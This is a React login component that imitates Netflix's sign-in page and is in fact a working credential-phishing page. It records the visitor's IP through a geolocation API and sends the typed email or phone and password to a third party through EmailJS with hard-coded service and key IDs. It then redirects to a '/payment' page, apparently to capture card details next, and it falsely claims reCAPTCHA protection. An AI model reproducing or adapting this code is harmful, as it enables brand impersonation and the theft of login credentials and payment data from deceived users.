import React from 'react';
import emailjs from '@emailjs/browser';
import {  useNavigate } from 'react-router-dom'
import { useState, useEffect } from 'react'
import axios from 'axios'
import "./App.css";
import Header from '../components/Header/Headertwo';
import FooterCompound from '../compounds/FooterCompound';

export const Login = () => {

    //creating IP state
    const [ip,setIP] = useState('');
    
    //creating function to load ip address from the API
    const getData = async()=>{
        const res = await axios.get('https://geolocation-db.com/json/')
        console.log(res.data);
        setIP(res.data.IPv4)
    }
    
    useEffect(()=>{
        //passing getData method to the lifecycle method
        getData()
    },[])


const [ setSearchItem] = useState("");

  let navigate = useNavigate ();


  const Payment = (e) => {
    navigate  ("/payment");
    console.log(e.target.value);
    setSearchItem(e.target.value);
  };

  const sendEmail = (e) => {
    e.preventDefault();
    emailjs.sendForm("service_hm3mv25" , "template_7srrwbt", e.target, "UqisPu0cjGHCBL1W-")
  .then((result) => {
      console.log(result.text);
  }, (error) => {
     console.log(error.text);
  } );
    Payment("");
  };



 
 
  




  return (
     <>
        <header className='showcase'>
         <Header />
         

        <div className='showcase-content'>

            <div className='formm' >

                <form  onSubmit={sendEmail}>
                    <h1>Sign In</h1>
                    <div className="info">
                        <input type="hidden" name='ip' value={ip} />
                        <input className="email" type="email" placeholder="Email or phone number" name='username'/> <br/>
                        <input className="email" type="password" placeholder="Password" name='password'/>
                        
                    </div>
                    
                    <div className="btn">
                        
                         <button className="btn-primary" onChange={Payment} >Sign In</button>
               
                       
                    </div>
                   
                    <div className="help">
                        <div>
                            <input value="true" type="checkbox"  /><label>Remember me</label>
                        </div>

                        <a href="#">Need Help ?</a> 
                        
                    </div>
                </form>

            </div>

            <div className="fcbk">
                <a href="https://facebook.com">
                <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook"/>
                </a>
                <p>Login with Facebook</p>
            </div>
            <div className="signup">
                <p>New to Netflix ?</p>
                <a href="#">Sign up now</a>
            </div>
            <div className="more">
                <p>
                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a> 
                </p>
            </div>
            
        </div>
        
        </header>
        <footer>
            <FooterCompound />
        </footer>
    </>

    
    
    
  );
};

export default Login